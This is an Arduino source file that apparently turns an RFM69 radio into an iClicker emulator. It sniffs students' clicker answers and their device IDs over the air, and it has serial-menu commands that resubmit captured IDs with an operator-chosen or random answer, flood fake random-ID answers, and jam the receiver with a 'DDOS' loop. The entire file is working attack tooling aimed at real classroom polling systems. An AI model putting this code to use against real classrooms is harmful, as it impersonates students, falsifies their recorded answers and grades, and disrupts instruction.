
#include "iClickerEmulator.h"
#include <RingBufCPP.h>
#include <string.h>

#define IS_RFM69HW false //make true if using w version
#define IRQ_PIN 6
#define CSN 10
#define MAX_BUFFERED_PACKETS 100

#define THRESHOLD 1000
#define MAX_RECVD 500

#define RAND_LOW 35
#define RAND_HIGH 75

iClickerAnswerPacket_t recvd[MAX_RECVD];
uint32_t num_recvd = 0;


iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);
RingBufCPP<iClickerPacket_t, MAX_BUFFERED_PACKETS> recvBuf;


void setup()
{
  Serial.begin(115200);
  //Serial.println("working");
  clicker.begin(iClickerChannels::AA);
  // enter promiscouse mode on sending channel
  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
  delay(1000);
  Serial.println("Ready!\nr: Reset Capture\na-e: Submit\ns: Start Capture\nt: Stop Capture\nf: Random id answers\nu: Uniform submit\no: DDOS 5 secs\np: Print");
}


void loop()
{
  iClickerPacket_t r;

  //see if there is a pending packet, check if its an answer packet
  //see if different than pre packet
  while (recvBuf.pull(&r) && r.type == PACKET_ANSWER) {
    handleCapture(r.packet.answerPacket);
  }

  if (Serial.available())
  {
    char c = Serial.read();

    switch (c)
    {
      case 'r': case 'R':
        Serial.println("******** EMPTIED SAVED RESPONSES ********");
        num_recvd = 0;
        break;

      case 'a': case 'b': case 'c': case 'd': case 'e':
        resubmit_ans(iClickerEmulator::charAnswer(c), 90); //resubmit 90%
        break;

      case 'f':
        ans_randoms(random(RAND_LOW, RAND_HIGH));
        break;

       case 'u':
         uniform_ans();
         break;

       case 'o':
          ddos();
          break;

       case 's':
        Serial.println("******** STARTED PROMISCUOUS ********");
        clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
        break;

       case 't':
        Serial.println("******** STOPPED PROMISCUOUS ********");
        clicker.stopPromiscuous();
        break;

      case 'p':
        printCap();
        break;
    }
  }

  delay(100);

}


void resubmit_ans(iClickerAnswer_t a, uint8_t percent)
{
  iClickerPacket_t r;
  uint16_t res[NUM_ANSWER_CHOICES] = { 0 };

  Serial.println("******** BEGIN ANSWER RESUBMIT ********");
  clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);

  while (!shouldExit())
  {
      if (recvBuf.pull(&r) && r.type == PACKET_ANSWER)
      {
          iClickerAnswerPacket_t ap = r.packet.answerPacket;
          handleCapture(ap);

          //should we resubmit?
          if (random(0, 100) < percent) {
              bool ret = clicker.submitAnswer(ap.id, a); // no ack
              printSubmission(ret, ap.id, a);
              // go back to promiscous mode
              clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
              res[a]++;
          } else {
              res[ap.answer]++;
          }
      }
      delay(10);
  }

  char tmp[100];
  snprintf(tmp, sizeof(tmp), "Resubmitted:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
           res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );
  Serial.println(tmp);
  Serial.println("******** END ANSWER RESUBMIT ********");
}


void uniform_ans()
{
    iClickerPacket_t r;
    Serial.println("******** BEGIN UNIFORM RESUBMIT ********");
    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
    uint16_t res[NUM_ANSWER_CHOICES] = { 0 };

    while (!shouldExit())
    {
        if (recvBuf.pull(&r) && r.type == PACKET_ANSWER)
        {
            iClickerAnswerPacket_t ap = r.packet.answerPacket;
            handleCapture(ap);
            iClickerAnswer_t answer = clicker.randomAnswer();
            bool ret = clicker.submitAnswer(ap.id, answer);
            printSubmission(ret, ap.id, answer);
            clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
            res[answer]++;
          }
          delay(10);
      }

      char tmp[100];
      snprintf(tmp, sizeof(tmp), "Resubmitted:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
               res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );
      Serial.println(tmp);
      Serial.println("******** END UNIFORM RESUBMIT ********");

}



void ans_randoms(int num)
{
  char tmp[100];
  //int num = random(RAND_LOW, RAND_HIGH);
  snprintf(tmp, sizeof(tmp), "SUBMITTED %d RANDOM ANS\n", num);
  clicker.floodAttack(num, 1);
  Serial.println(tmp);
}


void ddos()
{
    Serial.println("******** BEGIN DDOS ********");

    while (!shouldExit())
        clicker.ddos(1000);

    clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
    Serial.println("******** END DDOS ********");
}


void printCap()
{
  Serial.println("******** BEGIN DUMP********");
  char tmp[100];
  uint16_t res[NUM_ANSWER_CHOICES] = { 0 };
  for (uint32_t i = 0; i < num_recvd; i++)
  {
    res[recvd[i].answer]++;
    char answer = iClickerEmulator::answerChar((iClickerAnswer_t)recvd[i].answer);
    snprintf(tmp, sizeof(tmp), "Captured[%lu]: %c (%02X, %02X, %02X, %02X)", i, answer,
             recvd[i].id[0], recvd[i].id[1], recvd[i].id[2], recvd[i].id[3]);
    Serial.println(tmp);
  }

  snprintf(tmp, sizeof(tmp), "Results:\nA: %u\nB: %u\nC: %u\nD: %u\nE: %u\nP: %u\n",
           res[ANSWER_A], res[ANSWER_B], res[ANSWER_C], res[ANSWER_D], res[ANSWER_E], res[ANSWER_PING] );

  Serial.println(tmp);

  Serial.println("********END DUMP********");
}



// hlpers
void printSubmission(bool suc, uint8_t id[ICLICKER_ID_LEN], iClickerAnswer_t ans)
{
    char tmp[100];
    snprintf(tmp, sizeof(tmp), "%s %c for ID: (%02X, %02X, %02X, %02X)",
    suc ? "Successfully submitted" : "Failed to submit", iClickerEmulator::answerChar(ans), id[0], id[1], id[2], id[3]);
    Serial.println(tmp);
}


bool shouldExit()
{
    while (Serial.available()) {
      if (Serial.read() == 'x')
        return true;
    }

    return false;
}

void handleCapture(iClickerAnswerPacket_t answerPacket)
{
    char tmp[100];
    uint8_t *id = answerPacket.id;
    char answer = iClickerEmulator::answerChar((iClickerAnswer_t)answerPacket.answer);
    updateRef(answerPacket);
    snprintf(tmp, sizeof(tmp), "Captured [%lu]: %c (%02X, %02X, %02X, %02X)", num_recvd, answer, id[0], id[1], id[2], id[3]);
    Serial.println(tmp);
}


void recvPacketHandler(iClickerPacket_t *recvd)
{
  recvBuf.add(*recvd);
}


void updateRef(iClickerAnswerPacket_t p)
{
  uint32_t i = 0;
  for (i = 0; i < num_recvd; i++)
  {
    if (!memcmp(recvd[i].id, p.id, ICLICKER_ID_LEN))
    {
      //update
      recvd[i] = p;
      break;
    }
  }

  //not found and space
  if (i == num_recvd && num_recvd < MAX_RECVD) {
    recvd[num_recvd++] = p;
  }

}
